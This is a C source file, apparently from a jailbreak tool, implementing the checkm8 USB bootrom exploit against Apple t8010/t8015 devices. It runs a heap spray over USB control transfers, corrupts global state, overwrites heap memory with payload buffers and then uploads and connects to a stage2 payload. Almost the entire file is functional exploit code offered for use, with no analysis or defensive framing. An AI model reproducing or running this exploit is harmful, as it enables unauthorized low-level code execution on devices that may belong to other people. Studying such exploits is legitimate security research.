
#include <iousb.h>
#include <checkra1n_common.h>

static unsigned char blank[2048]; // 00000000...
static unsigned char AAAA[2048];  // 41414141...

static void heap_spray(io_client_t client){
    transfer_t result;
    UInt32 wLen;
    
    result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 2048);
    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
    usleep(1000);
    
    // For iOS devices (especially older ones)
    // Repeat forever until usb_ctrl_transfer(0x80,6,0x304,0x40a,blank,64) reaches Timeout
    for(int i=0;i<16384;i++){
        wLen = async_usb_ctrl_transfer_with_cancel_noloop(client, 0x80, 6, 0x0304, 0x040a, blank, 192, 1);
        result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
        if(result.ret != kIOReturnSuccess) break;
    }
    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
    
    for(int i=0;i<64;i++){
        result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
    }
    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
    
    result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
    
    for(int i=0;i<16;i++){
        result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
    }
    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
    
    result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
    
    result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
}

static void set_global_state(io_client_t client){
    transfer_t result;
    unsigned int val;
    UInt32 sent;
    
    val = 1408; // t8010 & t8015 & s5l8960x
    
    /* val haxx
     * If async_transfer() sent = 0x40, then val = 1408. And, it is possible to try again a few times and wait until sent = 0x40
     * However, even if sent != 0x40, it succeeds by subtracting the value from val.
     * To reduce the number of attempts, It decided to use subtraction unless sent is greater than val.
     */
    
    int i=0;
    while((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, AAAA, 2048, 0)) >= val){
        i++;
        DEBUG_LOG("[%s] retry: %x\n", __FUNCTION__, i);
        usleep(10000);
        result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, AAAA, 64);
        DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
        usleep(10000);
    }
    
    val += 0x40;
    val -= sent;
    
    DEBUG_LOG("[%s] sent: %x\n", __FUNCTION__, sent);
    DEBUG_LOG("[%s] val: %x\n", __FUNCTION__, val);
    
    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, AAAA, val, 100);
    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
    
    result = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
}

static void heap_occupation(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
    transfer_t result;
    
    result = usb_ctrl_transfer_with_time(client, 2, 3, 0x0000, 128, NULL, 0, 10);
    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
    usleep(100000);
    
    for(int i=0;i<16;i++){
        //r = async_usb_ctrl_transfer_with_cancel(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 0);
        result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
    }
    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
    usleep(10000);
    
    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, payload.over1, payload.over1_len, 100);
    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
    
    result = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, AAAA, 512, 100);
    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
    
    result = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, payload.over2, payload.over2_len, 100);
    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
    
    result = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
}

int checkra1n_t8010_t8015(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
    int r;
    
    bzero(blank, 2048);
    memset(AAAA, 'A', 2048);
    
    LOG_EXPLOIT_NAME("checkm8");
    
    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
    io_reset(client);
    io_close(client);
    client = NULL;
    usleep(10000);
    get_device_time_stage(&client, 5, DEVICE_DFU);
    if(!client) {
        LOG_ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG_PROGRESS("[%s] running heap_spray()", __FUNCTION__);
    heap_spray(client);
    
    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
    io_reset(client);
    io_close(client);
    client = NULL;
    usleep(10000);
    get_device_time_stage(&client, 5, DEVICE_DFU);
    if(!client) {
        LOG_ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG_PROGRESS("[%s] running set_global_state()", __FUNCTION__);
    set_global_state(client);
    
    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
    io_close(client);
    client = NULL;
    usleep(10000);
    get_device_time_stage(&client, 5, DEVICE_DFU);
    if(!client) {
        LOG_ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG_PROGRESS("[%s] running heap_occupation()", __FUNCTION__);
    heap_occupation(client, cpid, payload);
    
    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
    io_close(client);
    client = NULL;
    usleep(10000);
    get_device_time_stage(&client, 5, DEVICE_DFU);
    if(!client) {
        LOG_ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG_PROGRESS("[%s] sending stage2 payload", __FUNCTION__);
    r = payload_stage2(client, cpid, payload);
    if(r != 0){
        return -1;
    }
    
    r = connect_to_stage2(client, cpid, payload);
    if(r != 0){
        return -1;
    }
    
    return 0;
}
